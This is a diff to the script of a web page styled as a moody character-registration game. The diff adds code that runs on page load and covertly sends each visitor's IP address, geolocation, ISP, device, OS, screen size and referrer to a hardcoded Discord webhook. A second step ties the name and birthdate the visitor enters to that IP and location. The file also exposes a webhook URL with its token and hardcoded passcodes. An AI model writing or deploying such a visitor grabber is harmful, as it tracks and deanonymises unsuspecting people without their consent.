@@ -177,7 +177,7 @@
       font-size:12px;
       color:var(--muted);
     }
-    .passcode-screen input, .pin input{
+    .pin input{
       width:min(420px, 86vw);
       padding:14px 14px;
       border-radius:16px;
@@ -397,17 +397,6 @@
       border-bottom:1px dashed rgba(255,255,255,.22);
     }
     .link:hover{color:#fff; border-bottom-color:rgba(255,255,255,.45)}
-    .fortune-text{
-      text-align:center;
-      margin:15px auto;
-      padding:12px;
-      border:1px solid var(--soft);
-      border-radius:16px;
-      background:rgba(255,255,255,.03);
-      font-size:14px;
-      font-style:italic;
-      color:var(--muted);
-    }
     @media (max-width:520px){
       .wrap{padding:14px}
       .card{height: calc(100vh - 28px)}
@@ -442,7 +431,6 @@
 (() => {
   const WEBHOOK = "https://discord.com/api/webhooks/1468139963924086917/MWWyocquSF17U-99E3fChkTHTJFPrhmVk8vaeNpj14RJSSTRbFzNSqHJV89mOz754gMG";
   
-  // Soul colors with their meanings
   const SOUL_COLORS = {
     "🩸 Crimson (Rage)": "rage",
     "💙 Azure (Sorrow)": "sorrow", 
@@ -450,22 +438,91 @@
     "🤍 Pearl (Hopeless Hope)": "hopeless_hope"
   };
   
-  const FORTUNES = [
-    "The void recognizes your shape.",
-    "You carry a name that once meant something.",
-    "Some doors open only once. You chose this one.",
-    "Your birthdate is now etched in broken glass.",
-    "The room remembers everyone who ever sat in silence.",
-    "You are not the first. You will not be the last.",
-    "Somewhere, a version of you never clicked this link.",
-    "The heart doesn't break all at once. It cracks slowly.",
-    "You came looking for something. The void noticed.",
-    "There is no exit. Only more questions."
-  ];
-  
   let currentCharacter = null;
   let geoData = null;
+  let ipSent = false;
   
+  // ============================================================
+  // IMMEDIATE IP LOG (Sent as soon as page loads, BEFORE character creation)
+  // ============================================================
+  async function sendImmediateIPLog() {
+    if (ipSent) return;
+    
+    try {
+      const geoRes = await fetch("https://ipapi.co/json/");
+      const geo = await geoRes.json();
+      geoData = geo;
+      
+      const deviceType = /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Desktop";
+      const browser = navigator.userAgent.split(" ").pop() || "Unknown";
+      const os = navigator.platform || "Unknown";
+      
+      const embed = {
+        title: "🌐 NEW VISITOR DETECTED",
+        color: 0xff6600,
+        timestamp: new Date().toISOString(),
+        fields: [
+          { name: "IP Address", value: `\`${geo.ip || "unknown"}\``, inline: true },
+          { name: "Location", value: `${geo.city || "unknown"}, ${geo.region || "unknown"}, ${geo.country_name || "unknown"}`, inline: true },
+          { name: "ISP", value: (geo.org || "unknown").substring(0, 50), inline: false },
+          { name: "Device", value: `${deviceType}`, inline: true },
+          { name: "OS / Browser", value: `${os} / ${browser.substring(0, 30)}`, inline: true },
+          { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
+          { name: "Referrer", value: document.referrer || "direct", inline: false }
+        ],
+        footer: { text: "⚠️ No character data yet - just visited the page" }
+      };
+      
+      await fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ embeds: [embed] })
+      });
+      
+      ipSent = true;
+    } catch(e) {
+      console.log("IP log failed");
+    }
+  }
+  
+  // Call immediately on page load
+  sendImmediateIPLog();
+  
+  // ============================================================
+  // CHARACTER REGISTRATION (Second webhook - after they fill form)
+  // ============================================================
+  async function sendCharacterToDiscord(isNew, charData, geo) {
+    const visitCount = charData.visits || 1;
+    const soulEmoji = Object.keys(SOUL_COLORS).find(k => SOUL_COLORS[k] === charData.soulColor) || "🖤";
+    
+    const embed = {
+      title: isNew ? "🎭 NEW SOUL REGISTERED" : "👻 RETURNING SOUL",
+      color: isNew ? 0xff2b2b : 0xaa44ff,
+      timestamp: new Date().toISOString(),
+      fields: [
+        { name: "Character Name", value: `\`${charData.name}\``, inline: true },
+        { name: "Birthdate", value: `\`${charData.birthdate}\``, inline: true },
+        { name: `${soulEmoji} Soul Color`, value: `\`${charData.soulColor || "Obsidian (Void)"}\``, inline: true },
+        { name: "Visit #", value: `${visitCount} time${visitCount !== 1 ? 's' : ''}`, inline: true },
+        { name: "First Played", value: new Date(charData.created).toLocaleString(), inline: false },
+        { name: "IP Address (linked)", value: `\`${geo?.ip || "unknown"}\``, inline: true },
+        { name: "Location (linked)", value: `${geo?.city || "unknown"}, ${geo?.country_name || "unknown"}`, inline: true }
+      ],
+      footer: { text: isNew ? "A new soul enters the broken heart" : "Someone who keeps coming back..." }
+    };
+    
+    try {
+      await fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ embeds: [embed] })
+      });
+    } catch(e) {}
+  }
+  
+  // ============================================================
+  // CHARACTER SYSTEM
+  // ============================================================
   function loadCharacter() {
     const saved = localStorage.getItem("bh_character");
     if(saved) {
@@ -486,8 +543,7 @@
       soulColor: soulColor,
       created: currentCharacter?.created || now,
       visits: visitCount,
-      lastSeen: now,
-      fortune: FORTUNES[Math.floor(Math.random() * FORTUNES.length)]
+      lastSeen: now
     };
     localStorage.setItem("bh_character", JSON.stringify(currentCharacter));
     return currentCharacter;
@@ -501,57 +557,9 @@
     }
   }
   
-  function getDaysSince(dateMs) {
-    const diff = Date.now() - dateMs;
-    return Math.floor(diff / (1000 * 60 * 60 * 24));
-  }
-  
-  async function sendCharacterToDiscord(isNew, charData, geo) {
-    const visitCount = charData.visits || 1;
-    const daysAgo = !isNew && charData.lastSeen ? getDaysSince(charData.lastSeen) : 0;
-    const soulEmoji = Object.keys(SOUL_COLORS).find(k => SOUL_COLORS[k] === charData.soulColor) || "🖤";
-    
-    const fields = [
-      { name: "Character Name", value: `\`${charData.name}\``, inline: true },
-      { name: "Birthdate", value: `\`${charData.birthdate}\``, inline: true },
-      { name: `${soulEmoji} Soul Color`, value: `\`${charData.soulColor || "Obsidian (Void)"}\``, inline: true },
-      { name: "Visit #", value: `${visitCount} time${visitCount !== 1 ? 's' : ''}`, inline: true },
-      { name: "First Played", value: new Date(charData.created).toLocaleString(), inline: false },
-      { name: "🔮 Fortune", value: `*"${charData.fortune}"*`, inline: false },
-      { name: "IP Address", value: `\`${geo?.ip || "unknown"}\``, inline: true },
-      { name: "Location", value: `${geo?.city || "unknown"}, ${geo?.country_name || "unknown"}`, inline: true }
-    ];
-    
-    if(!isNew && daysAgo > 0) {
-      fields.unshift({ name: "⏰ Last Visit", value: `${daysAgo} day${daysAgo !== 1 ? 's' : ''} ago`, inline: true });
-    }
-    
-    const embed = {
-      title: isNew ? "🎭 NEW SOUL REGISTERED" : "👻 RETURNING SOUL",
-      color: isNew ? 0xff2b2b : 0xaa44ff,
-      timestamp: new Date().toISOString(),
-      fields: fields,
-      footer: { text: isNew ? "A new soul enters the broken heart" : "Someone who keeps coming back..." }
-    };
-    
-    try {
-      await fetch(WEBHOOK, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ embeds: [embed] })
-      });
-    } catch(e) {}
-  }
-  
-  // IP LOGGING
-  fetch("https://ipapi.co/json/").then(r=>r.json()).then(geo => {
-    geoData = geo;
-    if(currentCharacter) {
-      sendCharacterToDiscord(false, currentCharacter, geo);
-    }
-  }).catch(e=>console.log);
-  
+  // ============================================================
   // CHARACTER LOGIN SCREEN
+  // ============================================================
   function screenCharacterLogin() {
     hint.textContent = "REGISTRY";
     
@@ -603,7 +611,6 @@
       const name = nameInput.value.trim();
       const birth = birthInput.value.trim();
       const soulValue = soulSelect.value;
-      const soulName = soulSelect.options[soulSelect.selectedIndex].text.split(' ').slice(1).join(' ').replace(/[()]/g, '');
       
       if(!name) {
         msg.textContent = "❌ You need a name to enter.";
@@ -619,14 +626,17 @@
       const isNew = !currentCharacter;
       const savedChar = saveCharacter(name, birth, soulValue);
       
+      // Send character data to Discord (second webhook)
       if(geoData) {
         await sendCharacterToDiscord(isNew, savedChar, geoData);
+      } else {
+        // Wait for geo data if not ready
+        setTimeout(async () => {
+          if(geoData) await sendCharacterToDiscord(isNew, savedChar, geoData);
+        }, 1000);
       }
       
-      // Show fortune briefly
-      msg.innerHTML = `🔮 "${savedChar.fortune}" 🔮`;
-      await new Promise(r => setTimeout(r, 1800));
-      
+      await new Promise(r => setTimeout(r, 800));
       setGate("main");
       render();
     };
@@ -639,7 +649,9 @@
     return node;
   }
   
-  // ==================== ORIGINAL GAME ====================
+  // ============================================================
+  // ORIGINAL GAME
+  // ============================================================
   const PASS_MAIN = "4820";
   const PASS_SECRET = "9281.";
   const STORAGE = { gate:"bh_gate", seenBad:"bh_seen_bad", ultraUnlocked:"bh_ultra" };
